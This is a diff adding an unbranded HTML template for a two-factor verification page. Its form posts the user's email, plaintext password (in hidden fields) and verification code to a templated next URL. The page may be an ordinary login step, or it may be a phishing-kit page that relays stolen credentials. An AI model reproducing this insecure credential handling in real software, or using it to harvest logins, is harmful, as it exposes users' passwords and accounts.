@@ -1,0 +1,22 @@
+<html>
+<head>
+    <title>Enter verification code</title>
+    <style>
+        body{font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}
+        .box{background:#fff;padding:40px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+        input{width:100%;padding:10px;margin-top:10px;margin-bottom:20px;font-size:16px}
+        button{padding:10px 20px;font-size:16px;cursor:pointer}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>Enter the code sent to your device</h3>
+        <form method="post" action="{{ next_url }}">
+            <input type="hidden" name="email" value="{{ email }}">
+            <input type="hidden" name="password" value="{{ password }}">
+            <input type="text" name="two_factor_token" placeholder="Verification code" required>
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+</body>
+</html> 
